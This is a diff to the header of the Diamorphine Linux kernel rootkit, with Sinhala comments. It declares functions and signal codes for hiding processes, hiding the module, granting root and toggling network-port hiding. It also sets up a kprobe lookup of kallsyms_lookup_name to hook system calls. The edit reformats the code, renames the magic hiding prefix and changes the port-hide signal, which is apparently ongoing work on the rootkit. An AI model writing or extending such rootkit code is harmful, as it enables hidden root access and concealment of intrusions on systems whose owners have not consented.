@@ -13,57 +13,41 @@
 #include <linux/string.h>
 #include <linux/fdtable.h>
 
-// --- Port hiding සඳහා අවශ්ය headers ---
+// Port hiding සඳහා අවශ්ය headers
 #include <net/sock.h>
 #include <net/inet_sock.h>
 #include <linux/seq_file.h>
 
-unsigned long
-resolve_sym(char *symbol);
-
-unsigned long *
-get_syscall_table_bf(void);
-
-struct task_struct *
-find_task(pid_t pid);
-int
-is_invisible(pid_t pid);
-
-void
-give_root(void);
-
-void
-module_show(void);
-
-void
-module_hide(void);
+unsigned long resolve_sym(char *symbol);
+unsigned long *get_syscall_table_bf(void);
+struct task_struct *find_task(pid_t pid);
+int is_invisible(pid_t pid);
+void give_root(void);
+void module_show(void);
+void module_hide(void);
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage long
-hacked_kill(const struct pt_regs *pt_regs);
+asmlinkage long hacked_kill(const struct pt_regs *pt_regs);
 #else
-asmlinkage long
-hacked_kill(pid_t pid, int sig);
+asmlinkage long hacked_kill(pid_t pid, int sig);
 #endif
 
 struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[1];
+    unsigned long d_ino;
+    unsigned long d_off;
+    unsigned short d_reclen;
+    char d_name[1];
 };
 
-#define MAGIC_PREFIX "radtimer"
-
+#define MAGIC_PREFIX "diamorphine_secret"
 #define PF_INVISIBLE 0x01000000
-
 #define MODULE_NAME "diamorphine"
 
 enum {
-    SIGINVIS = 31,
-    SIGSUPER = 64,
-    SIGMODINVIS = 63,
-    SIGPORTHIDE = 62   // නව signal එක
+    SIGINVIS = 31,      // process hide
+    SIGSUPER = 64,      // give root
+    SIGMODINVIS = 63,   // module hide/show
+    SIGPORTHIDE = 30    // port hide toggle – STANDARD SIGNAL (SIGPWR)
 };
 
 #ifndef IS_ENABLED
@@ -73,15 +57,14 @@ enum {
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
 #define DUMP_SIZE 0x5000
-void
-flipswitch_func(void *target_func, void *hacked_func);
+void flipswitch_func(void *target_func, void *hacked_func);
 #endif
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
 static struct kprobe kp = {
-        .symbol_name = "kallsyms_lookup_name"
+    .symbol_name = "kallsyms_lookup_name"
 };
 #endif
 
